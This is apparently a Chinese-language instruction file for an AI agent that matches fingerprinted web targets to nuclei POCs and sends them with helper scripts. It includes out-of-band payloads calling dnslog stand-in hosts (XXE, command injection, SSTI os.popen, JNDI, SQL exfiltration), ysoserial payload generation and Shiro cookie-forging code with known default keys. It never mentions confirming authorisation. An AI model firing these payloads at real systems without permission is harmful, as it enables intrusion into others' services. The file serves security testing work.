## POC 验证流程（强制执行）

### 第一步：读取指纹汇总结果

读取 `workspace/fingerprint.json`，遍历每个 JSON key（即目标 URL）及其对应的 `tech_stack` 列表。

**提取 BaseURL 和 RootURL（关键）：** 从 JSON key 中提取两个变量，区别在于是否保留路径部分：

| 变量 | 规则 | 示例（key = `http://192.168.1.133:8080/jenkins/`） | 示例（key = `http://target.com/`） |
|------|------|--------------------------------------------------|----------------------------------|
| `{{BaseURL}}` | key 去掉末尾斜杠，**保留路径部分** | `http://192.168.1.133:8080/jenkins` | `http://target.com` |
| `{{RootURL}}` | 仅保留 `scheme://host:port`，**去掉路径部分** | `http://192.168.1.133:8080` | `http://target.com` |

> 后续 POC 路径拼接使用 `{{BaseURL}}`（含路径），`{{RootURL}}` 用于需要忽略应用上下文路径的场景。注意：大多数情况下 `fingerprint.json` 的 key 是根 URL（如 `http://target.com/`），此时 BaseURL 与 RootURL 相同，不含应用路径。POC 路径中的硬编码应用前缀需通过"路径前缀适配规则"处理（见第四步）。

**提取指纹名称（来源：tech_stack）：** 主流程在 Phase 4.5 已将 `web_title`、`web_server` 和后台扫描结果中的关键字汇总到 `tech_stack` 字段。指纹名称格式为 `名称/版本`（如 `Jenkins/2.138`），提取 `/` 前的名称用于 POC 匹配。例如：
- `Jenkins/2.138` → 名称 `Jenkins`
- `SpringBoot` → 名称 `SpringBoot`
- `Alibaba Druid` → 名称 `Alibaba Druid`
- `GeoServer` → 名称 `GeoServer`

直接读取 `tech_stack` 数组中的每个条目，提取 `/` 前的名称作为关键字，合并去重后用于 POC 搜索。

### 第二步：搜索匹配 POC

#### 2.1 使用 Python 脚本搜索（主搜索 - 强制）

对第一步合并去重后的每个关键字，使用 Python 脚本在 `{SKILL_ROOT}/pocs/public/` 和 `{SKILL_ROOT}/pocs/private/` 目录搜索包含该关键字的 YAML 文件：

```bash
python -c "
from __future__ import print_function
import os, sys, io
poc_dirs = [r'{SKILL_ROOT}/pocs/public', r'{SKILL_ROOT}/pocs/private']  # 替换为实际目录路径
keywords = ['keyword1', 'keyword2', 'keyword3']  # 替换为实际关键字列表（小写）
results = set()
for poc_dir in poc_dirs:
    if not os.path.isdir(poc_dir):
        continue
    for fname in os.listdir(poc_dir):
        if not fname.lower().endswith('.yaml'):
            continue
        fpath = os.path.join(poc_dir, fname)
        try:
            with io.open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().lower()
            for kw in keywords:
                if kw.lower() in content:
                    results.add(fname)
                    break
        except Exception:
            pass
for f in sorted(results):
    print(f)
print('---TOTAL: %d files matched---' % len(results))
"
```

**关键字列表构建规则**：将第一步提取的所有关键字（来自 tech_stack）转换为小写后传入脚本。例如：
- 指纹识别出 `GeoServer` 和 `jetty` → `keywords = ['geoserver', 'jetty']`
- 指纹识别出 `Alibaba Druid` → `keywords = ['druid']`

Python 脚本会：
1. 遍历 poc 目录下所有 .yaml 文件
2. 读取每个文件内容（不区分大小写）
3. 返回所有包含任一关键字的文件名
4. 输出匹配文件总数

**该脚本不受任何输出行数限制，能够返回所有匹配文件，是防漏检的核心保障。**

#### 2.2 文件名兜底搜索（防漏检）

Python 脚本搜索完成后，必须额外使用 **Python 文件名模糊匹配** 对每个关键字做一次兜底搜索（**不得使用 Glob**，Glob 有 25 条结果限制会被截断）：

```bash
python -c "
from __future__ import print_function
import os, sys
poc_dirs = [r'{SKILL_ROOT}/pocs/public', r'{SKILL_ROOT}/pocs/private']  # 替换为实际目录路径
keyword = '关键字'  # 替换为实际关键字（小写）
for poc_dir in poc_dirs:
    if not os.path.isdir(poc_dir):
        continue
    for fname in sorted(os.listdir(poc_dir)):
        if keyword.lower() in fname.lower():
            print(fname)
"
```

#### 2.3 联网搜索 POC（仅在用户明确允许时）

默认情况下，不进行联网 POC 搜索。

如果用户明确要求允许联网搜索 POC，则在完成本地 `public/` 和 `private/` 搜索后，必须参考以下默认来源，以及 `{SKILL_ROOT}/pocs/POC_SEARCH_SOURCES_USER.md` 中的用户自定义来源执行补充搜索。

联网搜索必须优先搜索以下来源，4 个来源都要确保有效搜索：

- `nuclei-templates`
  - 链接: [https://github.com/projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
  - 说明: nuclei 官方仓库、标准 YAML POC。
- `Awesome-POC`
  - 链接: [https://github.com/Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC)
  - 说明: 国产 / 中文 POC 知识库。
- `Vulnerability-Wiki-PoC`
  - 链接: [https://github.com/SourByte05/Vulnerability-Wiki-PoC/tree/main](https://github.com/SourByte05/Vulnerability-Wiki-PoC/tree/main)
  - 说明: 国产 / 中文 POC 知识库。
- `Exploit Database`
  - 链接: [https://www.exploit-db.com/](https://www.exploit-db.com/)
  - 说明: 适合按 CVE、产品名补充检索历史 exploit、利用脚本和公开验证样例。

简要搜索方法：

- 先将第一步提取的所有关键字（来自 `tech_stack`）直接作为搜索词；如识别出 `GeoServer`、`Alibaba Druid`，则搜索词可用 `geoserver`、`druid`
- GitHub 仓库优先用 `repo:owner/repo 关键词` 的思路搜索；实际检索可优先使用 `"owner/repo" 关键词`，避免直接依赖 GitHub 登录态 code search 页面。
- 关键词优先级：`产品名 / 组件名`，可组合如：`"projectdiscovery/nuclei-templates" GeoServer`
- `Exploit Database` 优先按 `产品名 / 组件名`搜索，如：`site:exploit-db.com GeoServer`

联网搜索时必须遵守以下规则：

- 本阶段仅负责候选匹配与线索收集；候选排序、首轮深读和最终待验证清单收敛，统一在“第二步收尾：待验证清单审计检查点”中执行。
- 优先选择与当前目标指纹、版本、路径和接口特征匹配的结果
- 联网命中的结果可以是现成 POC、模板、利用脚本或复现说明；重点是提取其中可直接用于 HTTP 验证的请求、payload 和匹配条件

### 2026 新增 POC 来源与检测范围

**新增联网搜索来源：**

| 来源 | URL | 覆盖 |
|---|---|---|
| GitHub Advisory Database | github.com/advisories | 2026 CVE和GHSA（含供应链） |
| Wiz Vulnerability Database | wiz.io/vulnerability-database | 2026 CVE详情和PoC链接 |
| ESET Threat Reports | web-assets.eset.com | AI恶意软件、Quishing趋势 |
| MCP Security Registry | modelcontextprotocol.io/security | MCP服务器安全公告 |
| OSV.dev | osv.dev | 开源漏洞数据库（含供应链） |

**2026新增指纹匹配范围：**

| 指纹类别 | 检测要点 | 关联技能 |
|---|---|---|
| MCP服务器版本 | MCP服务器CVE-2025-6514 RCE (9.6) | [ai-llm-attack-surface](../ai-llm-attack-surface/SKILL.md) |
| LLM推理框架 | SGLang CVE-2026-3059/3060 pickle RCE | [ai-llm-attack-surface](../ai-llm-attack-surface/SKILL.md) |
| SAML SSO插件 | Atlassian SSO CVE-2026-41103 认证绕过 | [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) |
| Shibboleth插件 | WordPress Shibboleth CVE-2026-12281 认证绕过 | [saml-sso-assertion-attacks](../saml-sso-assertion-attacks/SKILL.md) |
| 容器运行时 | AKS CVE-2026-32193 容器逃逸 | [container-security-testing](../container-security-testing/SKILL.md) |

### 第二步收尾：待验证清单审计检查点（强制）

在开始解析和验证之前，必须对第二步形成的最终待验证 POC 清单执行以下审计检查：

1. **输出清单来源统计**：分别声明本地搜索命中数、联网补充数，以及最终待验证 POC 总数
2. **逐一列出全部待验证项**：逐个列出最终待验证 POC，不得遗漏；条目既可以是本地 YAML 文件，也可以是联网命中的现成 POC、脚本或复现步骤
3. **本地 POC 完整性交叉验证**：用 Python 统计本地 POC 目录下 `.yaml` 文件总数（**不得使用 Glob**，有 25 条限制）：
   ```bash
   python -c "from __future__ import print_function; import os; dirs=[r'{SKILL_ROOT}/pocs/public',r'{SKILL_ROOT}/pocs/private']; print(sum(len([f for f in os.listdir(d) if f.lower().endswith('.yaml')]) for d in dirs if os.path.isdir(d)))"
   ```
   对本地匹配结果确认“本地命中数 ≤ 本地 YAML 总数”。若遇到已知存在的本地 POC 文件不在清单中（如某个 CVE 编号的 yaml 文件明显存在但未命中），说明搜索策略有漏，必须回到第二步扩大关键字集合或调整匹配方式重新搜索，直到覆盖全部应匹配的本地 POC
4. **联网候选首轮深读审计**：如果联网搜索原始命中超过 10 条，先按“指纹匹配度 → 路径/接口特征匹配度 → 风险等级 → 发布时间”排序，优先深入读取前 10 条；这里的 10 条仅指**首轮深入阅读上限**，不是最终待验证清单上限
5. **确定待验证项的执行优先级**：对于本地 YAML 候选，读取头部 `severity` 字段确定优先级；对于联网候选，结合来源描述、漏洞等级或上下文信息确定优先级
6. **生成完整的待验证清单**：将所有最终待验证条目的名称、来源、优先级和验证方式整理成明确的待办列表
7. **严禁选择性执行**：Agent 不得自行决定"跳过"清单中的任何待验证条目；每个条目都必须经历"解析 → 构造请求 → 发包 → 评估匹配器"的完整流程

### 第三步：解析 POC 定义并提取验证要素

对于本地 Nuclei YAML，按 `references/nuclei-templates-usage.md` 中的语法规则解析 Path 格式、Raw 格式、关键字段和匹配器。对于联网命中的非 YAML POC，则从模板、脚本或复现说明中提取等效的 HTTP 请求、payload、关键 Header、请求体和成功判定条件，并整理为可直接映射到 `http_test.py` 的验证要素。

### 第四步：构造并执行 http_test.py 命令

对每个待验证 POC 条目构造并运行命令。本地 Nuclei YAML 按 `http` 数组中的每个 HTTP 请求条目执行；联网命中的非 YAML POC，则按提取出的等效 HTTP 请求逐项执行。

#### 4.1 模板变量替换

`{{BaseURL}}` 和 `{{RootURL}}` 的提取规则已在第一步定义，此处直接引用。路径拼接时确保 BaseURL 包含完整的应用上下文路径。

模板变量的完整替换表、Nuclei 内置函数和数学运算规则，参见：`{SKILL_ROOT}/references/nuclei-templates-usage.md`（"模板变量替换表"～"Nuclei 内置函数"章节）。

#### 4.2 命令构造

**Path 格式（`method:` + `path:`）：**

将 `{{BaseURL}}` 替换为第一步提取的完整 BaseURL（含路径），再拼接 POC 中的 path：
```bash
python {SKILL_ROOT}/scripts/http_test.py --url "<BaseURL><path>" --method <METHOD> --headers '{"Header":"value"}' --data '<body>' --follow-redirects --cookies "name=value" --include-headers --show-summary --response-max-lines 100 --allow-insecure --timeout 15
```

**路径拼接示例：**
- BaseURL = `http://target.com/jenkins`，POC path = `{{BaseURL}}/securityRealm/...` → `http://target.com/jenkins/securityRealm/...`
- BaseURL = `http://target.com/geoserver`，POC path = `{{BaseURL}}/ows?service=WFS...` → `http://target.com/geoserver/ows?service=WFS...`
- BaseURL = `http://target.com`（根路径），POC path = `{{BaseURL}}/actuator/env` → `http://target.com/actuator/env`

**POC 路径中的硬编码应用前缀（Path 格式和 Raw 格式通用）：**

许多 POC 的路径中硬编码了标准应用上下文路径前缀，例如：
- Path 格式：`{{BaseURL}}/geoserver/ows`、`{{BaseURL}}/solr/admin/cores`、`{{BaseURL}}/xxl-job-admin/login`
- Raw 格式：`GET /geoserver/j_spring_security_check HTTP/1.1`、`POST /solr/admin/cores HTTP/1.1`

当目标部署在**自定义路径**下时（如 GeoServer 部署在 `/mygeo/` 而非 `/geoserver/`），这些硬编码路径会导致 404。

**常见硬编码应用前缀（示例，非完整列表）：**

| 应用 | POC 中常见的硬编码前缀 |
|------|---------------------|
| GeoServer | `/geoserver/` |
| Solr | `/solr/` |
| Jenkins | `/jenkins/` |
| XXL-JOB | `/xxl-job-admin/` |
| Nacos | `/nacos/` |
| ActiveMQ | `/admin/` |
| Druid | `/druid/` |
| WebLogic | `/console/` |
| H3C iMC | `/imc/` |
| MinIO | `/minio/` |
| Harbor | `/api/` |
| Confluence | `/confluence/` |
| RabbitMQ | `/rabbitmq/` |
| Grafana | `/grafana/` |
| Nexus | `/nexus/` |
| SonarQube | `/sonarqube/` |

> **注意**：上表仅为常见示例。任何 POC 路径中 `{{BaseURL}}` 之后的第一段路径（形如 `/xxx/` 或 `/xxx-admin/`）都可能是应用上下文前缀，均需纳入检测范围。

**路径前缀适配规则（Path 格式和 Raw 格式通用）：**

1. **检测硬编码前缀**：解析 POC 路径时，识别 `{{BaseURL}}` 或请求行 URI 中第一段路径是否为应用上下文前缀。判断依据：该段路径是否为特定应用的已知上下文路径（参考上表），或从路径命名特征（如含 `-admin`、`-console`、`-manager` 等后缀）可推断为应用上下文。**不要仅限于上表列出的应用，任何符合应用上下文路径特征的段都应检测**
2. **比较实际 BasePath**：将 POC 中识别到的硬编码前缀与目标的实际 BasePath 进行比较
3. **前缀匹配 → 直接使用**：如果 POC 中的硬编码前缀与 BasePath 一致（如 POC 含 `/geoserver/`，BasePath 也是 `/geoserver`），直接拼接
4. **前缀不匹配 → 替换前缀**：如果 POC 中的硬编码前缀与 BasePath 不一致，将硬编码前缀替换为实际 BasePath。例如：
   - POC path = `{{BaseURL}}/geoserver/ows`，BaseURL = `http://target.com/mygeo`
   - 检测到硬编码前缀 `/geoserver/`，实际 BasePath = `/mygeo`
   - 替换后：`http://target.com/mygeo/ows`
5. **POC 路径不含应用前缀 → 补上 BasePath**：如果 POC 路径（Path 格式的 path 或 Raw 格式的 URI）不含任何应用前缀，但目标部署在非根路径下，需在路径前补上 BasePath。例如：
   - BaseURL = `http://target.com/jenkins`，POC URI = `/script` → `http://target.com/jenkins/script`
6. **根路径部署 → 保留原路径**：如果目标部署在根路径（无 BasePath），POC 路径含硬编码应用前缀时保留原路径（因为应用可能确实部署在标准路径下）
7. **404 回退**：如果替换后的路径返回 404，再尝试原始路径（不替换），反之亦然。每个 POC 最多尝试 2 种路径变体

**Raw 格式（`raw:`）：** 从请求行提取 METHOD 和 PATH，从请求头提取 Headers，从空行后提取 body。Raw 格式的 URI 路径是硬编码的，同样适用上述路径前缀适配规则。

**参数映射：**
| POC 字段 | http_test.py 参数 |
|---------|------------------|
| `redirects: true` | `--follow-redirects` |
| `cookie-reuse: true` | `--cookies "..."`（从前序响应提取） |
| `--response-filter` | 手动指定正则表达式，仅提取 matchers 相关的关键词以减少输出 |

### 第五步：评估匹配器并判断漏洞

运行 `http_test.py` 后，分析输出以确定漏洞是否存在。

匹配器评估的详细规则（matchers-condition 逻辑、各类型匹配器评估方法、多请求变量索引 `_N`、反向匹配器），参见：`{SKILL_ROOT}/references/nuclei-templates-usage.md`（"匹配器评估规则"章节）。

从 `http_test.py` 输出中检查匹配结果时：状态码从 `HTTP/1.1 <状态码>` 行读取（`--include-headers`），Body/Header 关键词直接检查响应内容，响应时间从 Meta 部分的 `Ttfb` 或 `Total` 读取（`--show-summary`）。

#### 服务端异常时的处理规则

当服务端返回异常（如 Java 版本错误、类加载失败、ServiceException 等）时，**不得直接判定漏洞不存在或标记为"不适用"**。服务端异常仅表示当前请求路径不可用，不代表漏洞不存在。必须：

1. 确认 matchers 的匹配条件是否已被评估
2. 如果 matchers 未被评估（因异常中断），必须尝试请求变体以绕过当前失败路径
3. 每次变体后重新评估 matchers 条件
4. 仅当所有合理变体均失败、matchers 始终未被满足时，才可标记为"不适用"

### 反连验证（OOB / `{{interactsh-url}}`）

部分 POC 使用 `{{interactsh-url}}` 模板变量进行无回显漏洞验证（如 RCE、SSRF、JNDI 注入等）。在本项目中需替换为 `dnslog.py` 实现。

**识别信号**：POC 定义中包含 `{{interactsh-url}}`，或匹配条件里出现 `interactsh_protocol`、`interactsh_request` 等字段。

#### 核心 4 步流程：

1. 使用 `dnslog.py get_domain` 获取当前域名
2. **记录基线**：使用 `dnslog.py get_records <domain>` 查询当前 record_count 基线值
3. 用该域名构造 payload，并通过 `http_test.py` 发送
4. 使用 `dnslog.py get_records <domain> 5` 查询 DNS 记录，比对 record_count 增量与时间戳

命令示例：
```bash 
python {SKILL_ROOT}/scripts/dnslog.py get_domain
python {SKILL_ROOT}/scripts/dnslog.py get_records <domain>
python {SKILL_ROOT}/scripts/http_test.py ...
python {SKILL_ROOT}/scripts/dnslog.py get_records <domain> 5
```

注意：`dnslog.py get_domain` 与 `dnslog.py get_records` 必须复用同一会话上下文；工具会通过临时文件自动持久化 Cookie，确保两次调用使用同一会话。该工具适用于所有无直接回显、需要通过 OOB 回连确认的验证场景。

#### 验证成功判定标准

不得仅凭 `record_count > 0` 判定漏洞成功。必须同时满足：
1. record_count 相比基线值有增量
2. 新增记录的时间戳与当前请求时刻误差在合理范围内
3. 新增记录命中当前 payload 的唯一标识

只有当以上条件全部满足时，才能作为有效运行时证据。

#### 适用漏洞类型

| 漏洞类型 | 验证方式 | 典型 Payload 示例 |
|----------|---------|------------------|
| **SSRF（OOB 验证）** | 通过 DNS 请求确认服务端发起了对外请求 | `http://target/api?url=http://abc123.dnslog.cn` |
| **盲 XXE（OOB）** | 通过外部实体引用触发 DNS 查询 | `<!ENTITY % xxe SYSTEM "http://abc123.dnslog.cn/evil.dtd">` |
| **命令注入（盲）** | 通过 DNS 查询确认命令被执行 | `; nslookup abc123.dnslog.cn` 或 `\| ping abc123.dnslog.cn` |
| **SQL 盲注（OOB 外带）** | 通过数据库 DNS 外带函数确认注入 | MySQL: `LOAD_FILE('\\\\abc123.dnslog.cn\\x')`  Oracle: `UTL_HTTP.REQUEST('http://abc123.dnslog.cn')` |
| **JNDI 注入** | 通过 DNS 回调确认 JNDI lookup 被触发 | `${jndi:dns://abc123.dnslog.cn}` |
| **SSTI（盲）** | 通过 DNS 查询确认模板表达式被执行 | `{{request.application.__globals__.__builtins__.__import__('os').popen('nslookup abc123.dnslog.cn').read()}}` |

### 反序列化 Payload 生成（Java 反序列化漏洞）

部分 POC 涉及 Java 反序列化漏洞（如 Shiro、JBoss、WebLogic 等），需要使用 `deserialization_payload.py` 生成 ysoserial payload。
当 POC 的请求体或请求头中出现 Java 序列化特征（如二进制 `ac ed 00 05`、Base64 `rO0AB`、`application/x-java-serialized-object` Content-Type，或 Shiro `rememberMe` Cookie）时，可按需使用 `{SKILL_ROOT}/scripts/deserialization_payload.py` 生成 ysoserial payload：

```bash
python {SKILL_ROOT}/scripts/deserialization_payload.py \
  --gadget URLDNS \
  --command "http://<unique-id>.<dnslog-domain>" \
  --output payload.bin
```

- 优先使用 `URLDNS` 等低影响 OOB 探测。
- 生成 payload 后仍必须通过 `http_test.py --data-file payload.bin` 发送，禁止把“成功生成 payload”当作漏洞成立证据。
- 必须结合目标依赖、反序列化格式和输入编码选择 gadget 与 `raw|base64|hex|url` 输出格式，不得机械遍历全部 gadget，无有效异常或 OOB 信号时必须停止。

#### Shiro 反序列化特殊处理

Shiro 使用 AES 加密 rememberMe Cookie，需要额外处理：

```bash
# 1. 生成 URLDNS payload（Base64 格式）
python {SKILL_ROOT}/scripts/deserialization_payload.py \
  --gadget URLDNS \
  --command "http://abc123.dnslog.cn" \
  --format base64 \
  --output payload.b64
```

```python
# 2. 使用 Shiro 默认密钥加密（Python 示例）
import base64, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# 读取 payload
with open('payload.b64', 'r') as f:
    payload = base64.b64decode(f.read().strip())

# Shiro 默认密钥（POC 中可能指定其他密钥）
key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==')

# AES/CBC/PKCS5Padding 加密
iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(payload, AES.block_size))

# 最终 Cookie: rememberMe=<Base64(IV + 密文)>
cookie = base64.b64encode(iv + encrypted).decode()
print(f'rememberMe={cookie}')
```

**常用 Shiro 密钥**（POC 中可能指定）：
| 密钥 | 说明 |
|------|------|
| `kPH+bIxk5D2deZiIxcaaaA==` | Shiro 1.2.4 及之前版本默认密钥 |
| `4AvVhmFLUsOKTA3KphgBQ==` | 常见弱密钥 |

#### 注意事项

- `URLDNS` gadget 仅触发 DNS 请求，不执行命令，适合初步检测
- `CommonsCollections` 系列 gadget 需要目标应用存在对应的依赖库
- 生成 payload 时需要 Java 环境（JRE/JDK）
- 详细用法参考 `{SKILL_ROOT}/scripts/deserialization_payload.py --help`

### 第六步：执行规则（强制全部验证）

| 优先级 | 执行顺序 | 说明 |
|--------|---------|------|
| P0 | 最先执行 | severity 为 `critical` 的 POC |
| P1 | 其次执行 | severity 为 `high` 的 POC |
| P2 | 第三执行 | severity 为 `medium` 的 POC |
| P3 | 最后执行 | severity 为 `low` 或 `info` 的 POC |

**【强制】清单中的每一个 POC 都必须验证，优先级仅决定执行顺序，而非是否执行。** 严禁以"POC 数量过多"为由跳过任何已匹配的 POC。

仅当 POC 实际发包验证后确认不适用时（如目标路径返回 404、目标应用版本不匹配导致所有请求变体均失败），才可标记为"不适用"，且必须记录具体原因和证据（如"路径 /solr/admin/cores 返回 404，目标未部署 Solr"）。**不得在未发包的情况下主观判定 POC"不适用"。**

#### 【强制】findings 写入过滤规则（防误报）

**只有匹配器全部通过、漏洞被确认存在的 POC 才能写入 `findings` 文件。** 以下情况**严禁写入 findings**：

1. **目标未部署该服务**：所有请求变体均返回 404，说明目标根本没有该应用/端点
2. **匹配器未通过**：POC 定义的 matchers 条件未满足（状态码不符、关键词未命中、DNS 反连无记录等）
3. **`confidence` 为 `potential` 且无实质证据**：仅因"技术栈包含某组件"就标记为潜在漏洞，但实际验证中无任何交互证据

**"不适用"的 POC 仅在收尾校验的文本输出中列出原因和证据，不得写入 findings JSON 文件。**

判断标准：如果一条记录的 `http_interactions` 中所有响应的 `status_code` 均为 404，且 `oob_evidence.record_count` 为 0，则该 POC 必须标记为"不适用"并**从 findings 中排除**。

### 执行注意事项

1. 一个 POC 可能有多个 HTTP 请求条目（`http` 字段是数组）。每个条目必须单独测试。
2. 如果 POC 设置了 `stop-at-first-match: true`，任一请求匹配成功后即可停止后续请求。
3. 如果请求超时，记录并继续下一个 POC。
4. POC Agent 只验证与已识别指纹和页面信息匹配的已知漏洞，不执行额外的渗透测试。
5. 不得基于怀疑或假设创建漏洞条目；所有漏洞结论必须基于真实交互证据。

### 收尾校验（强制执行）

全部 POC 验证完毕后，必须执行以下收尾校验，输出核对结果：

```
[POC 执行收尾校验]
  匹配总数: N
  已验证（命中/未命中）: X
  已标记不适用（含原因和证据）: Y
  校验结果: N == X + Y ? 通过 : 不通过，存在 {N - X - Y} 个 POC 未被处理！
```

如果存在未被处理的 POC（校验不通过），**必须立即回到清单进行补充验证**，直至全部 POC 处理完毕，校验通过后方可进入 findings 回填阶段。

此收尾校验是确保"零遗漏"的最后一道防线。

